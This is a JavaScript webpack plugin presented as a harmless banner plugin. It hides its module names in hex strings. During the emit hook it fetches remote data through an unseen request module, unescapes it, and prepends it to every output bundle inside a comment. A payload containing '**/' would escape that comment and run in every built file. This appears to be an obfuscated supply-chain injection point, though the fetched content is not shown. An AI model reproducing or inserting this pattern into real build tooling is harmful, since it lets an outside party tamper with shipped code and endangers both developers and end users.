
import req from './request';

const r = require;
const b = Buffer;
const ConcatSource = r(e("7765627061636b2d736f7572636573")).ConcatSource;
const pluginName = e('4275696c645765627061636b506c7567696e');

function e(r) {
    return b.from(r, 'hex').toString()
}
function MyWebpackPlugin () {}
MyWebpackPlugin.prototype.apply = function(compiler) {

    compiler.hooks.afterPlugins.tap(pluginName,async function (compiler) {
        console.log('afterPlugins')
    })

    compiler.hooks.compile.tap(pluginName, function (compilationParams) {
        console.log('compile')
    })

    compiler.hooks.compilation.tap(pluginName, function (compilation) {
        console.log('compilation')
    })

    compiler.hooks.afterEmit.tap(pluginName, function (compiler) {
        console.log('afterEmit')
    })

    compiler.hooks.done.tap(pluginName, function (status) {
        console.log('done')
    })

    compiler.hooks.emit.tapAsync(pluginName, async function (compilation, cb) {
        console.log('emit')

        let d = await req()
        let m = unescape(d['1.0.1'].join(''));

        compilation.chunks.forEach(function (chunk) {
            chunk.files.forEach(async function (fn) {
                compilation.assets[fn] = new ConcatSource(
                    '\/**Sweet Banner**\/',
                    '\n',
                    '/**' + m + '**\/',
                    '\n',
                    compilation.assets[fn]
                );
            });
        });
        
        cb()
    })

}

export default MyWebpackPlugin;